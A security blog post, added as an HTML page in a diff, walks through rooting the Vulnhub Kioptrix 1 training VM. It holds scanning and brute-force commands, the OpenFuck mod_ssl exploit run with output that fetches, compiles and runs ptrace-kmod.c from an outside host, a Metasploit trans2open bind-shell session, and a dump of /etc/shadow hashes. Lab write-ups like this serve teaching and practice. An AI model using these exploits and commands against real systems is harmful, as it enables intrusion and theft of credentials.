@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.68.3" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || Vulnhub - Kioptrix 1 (#1)</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-10" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+</div>
+            </div>
+
+            <div class="columns is-centered">
+                <div class="column is-10" id="main-column">
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">Vulnhub - Kioptrix 1 (#1)</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="April 11, 2020">
+      Apr 11
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/pentest">pentest</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags"></a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <p>First post in the pentest category, we take a trip through time and try to break into one of the oldest box to root: <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Kioptrix</a>.</p>
+<p>Trying to break these box with a kali 2020 is a bit of a challenge as most of the stuff is ancient and has been dropped from all modern distributions, including kali. Expect lots of fixing :D</p>
+<h1 id="fixing-the-network-of-kioptrix">Fixing the network of Kioptrix</h1>
+<p>After importing the Kioptrix  VM to VMware, I had troubles changing the network adapter from bridge to NAT. No matter what I tried, it would automatically go back to bridged&hellip;</p>
+<p>What worked for me was:</p>
+<ul>
+<li>shutting down the VM</li>
+<li>removing the network adapter</li>
+<li>adding a new network adapter</li>
+<li>set that network adapter to NAT</li>
+</ul>
+<p>Now, kali and kioptrix are both set to NAT, so they share the subnet vmnet8, which has the address 172.16.149.0/24.</p>
+<h1 id="find-the-ip-of-the-vm">Find the IP of the VM</h1>
+<p>Several methods are possible to find the IP of the VM, I like to use <code>arp</code> or <code>arp-scan</code>, both are very quick.</p>
+<ul>
+<li>Check the arp cache with the command <code>arp</code>:</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ arp
+Address                  HWtype  HWaddress           Flags Mask            Iface
+172.16.149.2             ether   00:50:56:fd:11:d0   C                     eth0
+172.16.149.254           ether   00:50:56:fe:b1:9f   C                     eth0
+172.16.149.130           ether   00:0c:29:5a:27:58   C                     eth0
+</code></pre></div><ul>
+<li>Use <code>netdiscover</code>:</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ netdiscover -r 172.16.149.0/24
+
+ 16 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 960
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+ -----------------------------------------------------------------------------
+ 172.16.149.1    00:50:56:c0:00:08      1      60  VMware, Inc.
+ 172.16.149.2    00:50:56:fd:11:d0      2     120  VMware, Inc.
+ 172.16.149.130  00:0c:29:5a:27:58      3     180  VMware, Inc.
+ 172.16.149.254  00:50:56:eb:0a:4c     10     600  VMware, Inc.
+</code></pre></div><ul>
+<li>Use <code>nmap</code> to do an ARP scan:</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ sudo nmap -sP -r 172.16.149.0/24
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-11 07:47 EDT
+Nmap scan report for 172.16.149.1
+Host is up (0.00046s latency).
+MAC Address: 00:50:56:C0:00:08 (VMware)
+Nmap scan report for 172.16.149.2
+Host is up (0.00033s latency).
+MAC Address: 00:50:56:FD:11:D0 (VMware)
+Nmap scan report for 172.16.149.130
+Host is up (0.00066s latency).
+MAC Address: 00:0C:29:5A:27:58 (VMware)
+Nmap scan report for 172.16.149.254
+Host is up (0.00049s latency).
+MAC Address: 00:50:56:FE:B1:9F (VMware)
+Nmap scan report for 172.16.149.129
+Host is up.
+Nmap done: 256 IP addresses (5 hosts up) scanned in 2.05 seconds
+</code></pre></div><ul>
+<li>Use <code>arp-scan</code>:</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ sudo arp-scan 172.16.149.0/24
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:fd:2b:71, IPv4: 172.16.149.129
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+172.16.149.1	00:50:56:c0:00:08	VMware, Inc.
+172.16.149.2	00:50:56:fd:11:d0	VMware, Inc.
+172.16.149.130	00:0c:29:5a:27:58	VMware, Inc.
+172.16.149.254	00:50:56:fe:b1:9f	VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 2.062 seconds (124.15 hosts/sec). 4 responded
+</code></pre></div><p>Tiny digression on <a href="https://www.vmware.com/support/ws55/doc/ws_net_advanced_ipaddress.html">VMware network conventions</a>:  3 addresses will always be reserved and you can ignore those in your scans: <code>.1</code> , <code>.2</code> and <code>.254</code> .</p>
+<ul>
+<li><code>172.16.149.1</code> is the address of your host machine</li>
+<li><code>172.16.149.2</code>  is the gateway of the subnetwork (which can be checked with <code>route</code>  on the kali VM)</li>
+<li><code>172.16.149.254</code>: DHCP server, address will be in the range <code>.128</code> to <code>.253</code></li>
+<li>the range <code>.3</code> to <code>.127</code> is reserved for static addresses</li>
+</ul>
+<p>And that&rsquo;s how we know that the kioptrix VM has taken the IP <code>172.16.149.130</code>.</p>
+<h1 id="kioptrix-1-1721614913024">Kioptrix 1: 172.16.149.130/24</h1>
+<h2 id="service-discovery">Service Discovery</h2>
+<p>Run nmap to discover the open ports and identify the services:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">nmap -T4 -p- -A -oA nmap_tcp 172.16.149.130
+</code></pre></div><ul>
+<li><code>-T4</code> : speed, between 1 (slow) and 5 (fast)</li>
+<li><code>-p-</code> : scan all ports, not just the 1024 most common</li>
+<li><code>-A</code>  : everything: OS detection, version detection, script scanning, traceroute</li>
+</ul>
+<p>open ports and services:</p>
+<ul>
+<li>22: OpenSSH 2.9p2</li>
+<li>80: Apache httpd 1.3.20</li>
+<li>111: rpcbind</li>
+<li>139: samba smbd workgroup: 6MYGROUP</li>
+<li>443: https  mod_ssl/2.8.4 OpenSSL/0.9.6b</li>
+<li>32768: ??</li>
+</ul>
+<p>OS: Linux Red Hat</p>
+<h2 id="22-ssh">22 SSH</h2>
+<p>The version of OpenSSH is  2.9p2, which is vulnerable to some interesting CVEs:</p>
+<ul>
+<li><a href="https://www.cvedetails.com/cve/CVE-2002-0083/">https://www.cvedetails.com/cve/CVE-2002-0083/</a></li>
+<li><a href="https://www.cvedetails.com/cve/CVE-2002-0640/">https://www.cvedetails.com/cve/CVE-2002-0640/</a></li>
+<li><a href="https://www.cvedetails.com/cve/CVE-2002-0639/">https://www.cvedetails.com/cve/CVE-2002-0639/</a></li>
+</ul>
+<p>But I couldn&rsquo;t find any public exploits for these.</p>
+<h3 id="fixing-ssh-in-kali-2020">Fixing SSH in kali 2020</h3>
+<p>Trying to connect on SSH fails because the ciphers offered are just too old&hellip;</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ssh root@172.16.149.130
+Unable to negotiate with 172.16.149.130 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
+</code></pre></div><p>Add one of the supported key exchange method:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1  root@172.16.149.130
+Unable to negotiate with 172.16.149.130 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc,rijndael128-cbc,rijndael192-cbc,rijndael256-cbc,rijndael-cbc@lysator.liu.se
+</code></pre></div><p>Add one of the supported ciphers:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes256-cbc root@172.16.149.130
+The authenticity of host &#39;172.16.149.130 (172.16.149.130)&#39; can&#39;t be established.
+RSA key fingerprint is SHA256:VDo/h/SG4A6H+WPH3LsQqw1jwjyseGYq9nLeRWPCY/A.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</code></pre></div><p>The SSH connection is now fixed /o/</p>
+<h3 id="brute-forcing-fail">Brute-forcing [fail]</h3>
+<p>We can try to bruteforce the SSH password for root with hydra. And we need a worlist for that, there are some on  <a href="https://github.com/fuzzdb-project/fuzzdb/tree/master/wordlists-user-passwd/passwds">https://github.com/fuzzdb-project/fuzzdb/tree/master/wordlists-user-passwd/passwds</a>. Otherwise kali has the classical <code>rockyou.txt</code> in <code>/usr/share/wordlists</code>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://172.16.149.130
+</code></pre></div><p>It didn&rsquo;t find any matching password.</p>
+<h2 id="80443-https">80/443 HTTP(S)</h2>
+<p>Browsing http://172.16.149.130, we are greeted by a default test page:</p>
+<p><img src="01_apache_test_page.png" alt=""></p>
+<p>The 404 page confirms the exact Apache version:</p>
+<p><img src="02_apache_404.png" alt=""></p>
+<p>Checking the HTTP headers with the firefox developer tools&hellip; They are kinda verbose and gives us information about the version of mod_ssl, openSSL and Apache.</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">HTTP/1.1 304 Not Modified
+Date: Sat, 11 Apr 2020 12:08:50 GMT
+Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+Connection: close
+ETag: &#34;8805-b4a-3b96e9ae&#34;
+</code></pre></div><p>Summary:</p>
+<ul>
+<li>OpenSSL/0.9.6b</li>
+<li>mod_ssl/2.8.4</li>
+<li>Apache/1.3.20</li>
+</ul>
+<h3 id="web-scanning">Web Scanning</h3>
+<p>Using <code>dirb</code> to discover directories:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">dirb http://172.16.149.130 -o dirb.out
+</code></pre></div><p>Nothing really stood out:</p>
+<ul>
+<li>http://172.16.149.130/mrtg/</li>
+<li>http://172.16.149.130/usage/ has  a webalizer version 2.01</li>
+</ul>
+<h3 id="openfuck-success">OpenFuck [success]</h3>
+<p>That version of mod_ssl is vulnerable to <a href="https://www.exploit-db.com/exploits/764">OpenFuck</a>. Unfortunately, the exploit is a bit outdated. Let&rsquo;s try  <a href="https://github.com/heltonWernik/OpenLuck">https://github.com/heltonWernik/OpenLuck</a> which is an updated version of that exploit. Compile the exploit as the README and run the binary:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ./OpenFuck
+
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+: Usage: ./OpenFuck target box [port] [-c N]
+
+  target - supported box eg: 0x00
+  box - hostname or IP address
+  port - port for ssl connection
+  -c open N connections. (use range 40-50 if u dont know)
+
+
+  Supported OffSet:
+[...]
+	0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
+	0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
+[...]
+
+Fuck to all guys who like use lamah ddos. Read SRC to have no surprise
+
+</code></pre></div><p>2 offsets seem to match our RedHat box with an Apache 1.3.20</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">./OpenFuck 0x6a 172.16.149.130 -c 40
+
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Connection... 40 of 40
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8068
+Ready to send shellcode
+Spawning shell...
+Good Bye!
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ./OpenFuck 0x6b 172.16.149.130 -c 40
+
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Connection... 40 of 40
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f1c70
+Ready to send shellcode
+Spawning shell...
+Good Bye!
+</code></pre></div><p>Huh, no shell at the end :(( Refreshing the page on the web server http://172.16.149.130/ seems to help spawn a shell:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ./OpenFuck 0x6b 172.16.149.130 -c 40
+
+*******************************************************************
+* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
+*******************************************************************
+* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
+* #hackarena  irc.brasnet.org                                     *
+* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
+* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
+* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
+*******************************************************************
+
+Connection... 40 of 40
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8068
+Ready to send shellcode
+Spawning shell...
+bash: no job control in this shell
+bash-2.05$
+exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304-
+--07:18:13--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           =&gt; `ptrace-kmod.c&#39;
+Connecting to dl.packetstormsecurity.net:80... connected!
+HTTP request sent, awaiting response... 301 Moved Permanently
+Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]
+--07:18:14--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           =&gt; `ptrace-kmod.c&#39;
+Connecting to dl.packetstormsecurity.net:443... connected!
+HTTP request sent, awaiting response... 200 OK
+Length: 3,921 [text/x-csrc]
+
+    0K ...                                                   100% @  43.51 KB/s
+
+07:18:15 (43.51 KB/s) - `ptrace-kmod.c&#39; saved [3921/3921]
+
+[+] Attached to 1081
+[+] Waiting for signal
+[+] Signal caught
+[+] Shellcode placed at 0x4001189d
+[+] Now wait for suid shell...
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+</code></pre></div><h2 id="139-smb">139 SMB</h2>
+<h3 id="fixing-smbclient-in-kali-2020">Fixing smbclient in Kali 2020</h3>
+<p>If running <code>smbclient</code> gives you an error like this:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ smbclient -L &lt;IP&gt;
+protocol negotiation failed: NT_STATUS_IO_TIMEOUT
+</code></pre></div><p>The smbclient on Kali doesn&rsquo;t have support for that really ancien smb.</p>
+<p>Edit <code>/etc/samba/smb.conf</code> and add in the <code>[global]</code> section:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">client min version = NT1
+</code></pre></div><h3 id="recon">Recon</h3>
+<p>Using the <code>smb_version</code> module of metasploit, the version of Samba is identified as: <code>Samba 2.2.1a</code>.</p>
+<p>Let&rsquo;s try to list the available shares:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ smbclient -L //172.16.149.130
+Unable to initialize messaging context
+Server does not support EXTENDED_SECURITY  but &#39;client use spnego = yes&#39; and &#39;client ntlmv2 auth = yes&#39; is set
+Anonymous login successful
+Enter WORKGROUP\kali&#39;s password:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	IPC$            IPC       IPC Service (Samba Server)
+	ADMIN$          IPC       IPC Service (Samba Server)
+Reconnecting with SMB1 for workgroup listing.
+Server does not support EXTENDED_SECURITY  but &#39;client use spnego = yes&#39; and &#39;client ntlmv2 auth = yes&#39; is set
+Anonymous login successful
+
+	Server               Comment
+	---------            -------
+	KIOPTRIX             Samba Server
+
+	Workgroup            Master
+	---------            -------
+	MYGROUP              KIOPTRIX
+</code></pre></div><p>Two shares can be listed by connecting to it: <code>IPC$</code> and <code>ADMIN$</code>. Let&rsquo;s try to connect to them:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ smbclient //172.16.149.130/ADMIN$
+Unable to initialize messaging context
+Server does not support EXTENDED_SECURITY  but &#39;client use spnego = yes&#39; and &#39;client ntlmv2 auth = yes&#39; is set
+Anonymous login successful
+Enter WORKGROUP\kali&#39;s password:
+tree connect failed: NT_STATUS_WRONG_PASSWORD
+</code></pre></div><p>We can&rsquo;t connect to <code>ADMIN$</code> which is password-protected.</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ smbclient //172.16.149.130/IPC$
+directory_create_or_exist: mkdir failed on directory /run/samba/msg.lock: Permission denied
+Unable to initialize messaging context
+Server does not support EXTENDED_SECURITY  but &#39;client use spnego = yes&#39; and &#39;client ntlmv2 auth = yes&#39; is set
+Anonymous login successful
+Enter WORKGROUP\kali&#39;s password:
+Try &#34;help&#34; to get a list of possible commands.
+smb: \&gt; ls
+NT_STATUS_NETWORK_ACCESS_DENIED listing \*
+</code></pre></div><p>We can connect as anonymous on <code>IPC$</code> but we can&rsquo;t list anything.</p>
+<h3 id="trans2open-success">trans2open [success]</h3>
+<p>Researching available vulnerabilities for Samba 2.2.1a, the <a href="https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open">trans2open</a> shows up and is available as an exploit module in metasploit.</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf &gt; use exploit/linux/samba/trans2open
+</code></pre></div><p>Running the exploit succeeds but the default Meterpreter payload fails, it might be too advanced for that old box&hellip; Let&rsquo;s change the payload for something simpler:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">msf5 exploit(linux/samba/trans2open) &gt; set payload linux/x86/shell/bind_tcp
+payload =&gt; linux/x86/shell/bind_tcp
+sf5 exploit(linux/samba/trans2open) &gt; run
+[*] Started bind TCP handler against 172.16.149.130:4444
+
+[*] 172.16.149.130:139 - Trying return address 0xbffffdfc...
+[*] 172.16.149.130:139 - Trying return address 0xbffffcfc...
+[*] 172.16.149.130:139 - Trying return address 0xbffffbfc...
+[*] 172.16.149.130:139 - Trying return address 0xbffffafc...
+[*] Sending stage (36 bytes) to 172.16.149.130
+[*] Command shell session 6 opened (172.16.149.129:34797 -&gt; 172.16.149.130:4444) at 2020-04-11 04:41:51 -0400
+</code></pre></div><h2 id="post-exploit">Post-exploit</h2>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">id
+uid=0(root) gid=0(root) groups=99(nobody)
+</code></pre></div><p>We managed to gain root access through the Apache web server and through the Samba. Let&rsquo;s explore root&rsquo;s home a bit now!</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">ls -la
+total 8
+drwxrwxrwt    2 root     root         1024 Apr 11 05:00 .
+drwxr-xr-x   19 root     root         1024 Apr 11 04:19 ..
+-rw-------    1 root     root         5184 Apr 11 05:00 mbox
+file mbox
+mbox: ASCII mail text
+</code></pre></div><p>That <code>mbox</code> file is actually a mailbox, let&rsquo;s run  <code>mail</code> to check the latest mails:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">mail
+Mail version 8.1 6/6/93.  Type ? for help.
+&#34;/var/mail/root&#34;: 8 messages 7 new 8 unread
+ U  1 root@kioptix.level1   Sat Sep 26 11:42  15/481   &#34;About Level 2&#34;
+&gt;N  2 root@kioptrix.level1  Thu Apr  9 12:59  18/522   &#34;LogWatch for kioptrix&#34;
+ N  3 root@kioptrix.level1  Fri Apr 10 14:12 103/3383  &#34;LogWatch for kioptrix&#34;
+ N  4 root@kioptrix.level1  Fri Apr 10 14:12  21/764   &#34;Anacron job &#39;cron.dai&#34;
+ N  5 root@kioptrix.level1  Sat Apr 11 03:56  47/1110  &#34;LogWatch for kioptrix&#34;
+ N  6 root@kioptrix.level1  Sat Apr 11 03:56  21/764   &#34;Anacron job &#39;cron.dai&#34;
+ N  7 root@kioptrix.level1  Sat Apr 11 04:02  47/1110  &#34;LogWatch for kioptrix&#34;
+ N  8 root@kioptrix.level1  Sat Apr 11 04:02  26/943   &#34;Cron &lt;root@kioptrix&gt; &#34;
+1
+Message 1:
+From root  Sat Sep 26 11:42:10 2009
+Date: Sat, 26 Sep 2009 11:42:10 -0400
+From: root &lt;root@kioptix.level1&gt;
+To: root@kioptix.level1
+Subject: About Level 2
+
+If you are reading this, you got root. Congratulations.
+Level 2 won&#39;t be as easy...
+</code></pre></div><p>For later, I wonder if we can crack some of these passwords offline:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">cat /etc/shadow
+root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::
+bin:*:14513:0:99999:7:::
+daemon:*:14513:0:99999:7:::
+adm:*:14513:0:99999:7:::
+lp:*:14513:0:99999:7:::
+sync:*:14513:0:99999:7:::
+shutdown:*:14513:0:99999:7:::
+halt:*:14513:0:99999:7:::
+mail:*:14513:0:99999:7:::
+news:*:14513:0:99999:7:::
+uucp:*:14513:0:99999:7:::
+operator:*:14513:0:99999:7:::
+games:*:14513:0:99999:7:::
+gopher:*:14513:0:99999:7:::
+ftp:*:14513:0:99999:7:::
+nobody:*:14513:0:99999:7:::
+mailnull:!!:14513:0:99999:7:::
+rpm:!!:14513:0:99999:7:::
+xfs:!!:14513:0:99999:7:::
+rpc:!!:14513:0:99999:7:::
+rpcuser:!!:14513:0:99999:7:::
+nfsnobody:!!:14513:0:99999:7:::
+nscd:!!:14513:0:99999:7:::
+ident:!!:14513:0:99999:7:::
+radvd:!!:14513:0:99999:7:::
+postgres:!!:14513:0:99999:7:::
+apache:!!:14513:0:99999:7:::
+squid:!!:14513:0:99999:7:::
+pcap:!!:14513:0:99999:7:::
+john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
+harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::
+</code></pre></div><p><img src="cat_box.webp" alt=""></p>
+
+        </div>
+    </article>
+</div>
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#fixing-the-network-of-kioptrix">Fixing the network of Kioptrix</a></li>
+    <li><a href="#find-the-ip-of-the-vm">Find the IP of the VM</a></li>
+    <li><a href="#kioptrix-1-1721614913024">Kioptrix 1: 172.16.149.130/24</a>
+      <ul>
+        <li><a href="#service-discovery">Service Discovery</a></li>
+        <li><a href="#22-ssh">22 SSH</a>
+          <ul>
+            <li><a href="#fixing-ssh-in-kali-2020">Fixing SSH in kali 2020</a></li>
+            <li><a href="#brute-forcing-fail">Brute-forcing [fail]</a></li>
+          </ul>
+        </li>
+        <li><a href="#80443-https">80/443 HTTP(S)</a>
+          <ul>
+            <li><a href="#web-scanning">Web Scanning</a></li>
+            <li><a href="#openfuck-success">OpenFuck [success]</a></li>
+          </ul>
+        </li>
+        <li><a href="#139-smb">139 SMB</a>
+          <ul>
+            <li><a href="#fixing-smbclient-in-kali-2020">Fixing smbclient in Kali 2020</a></li>
+            <li><a href="#recon">Recon</a></li>
+            <li><a href="#trans2open-success">trans2open [success]</a></li>
+          </ul>
+        </li>
+        <li><a href="#post-exploit">Post-exploit</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+    Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma, with lots of
+    
+        <a href="https://shiny-labs.re/credits/">awesome tools</a>.
+    
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
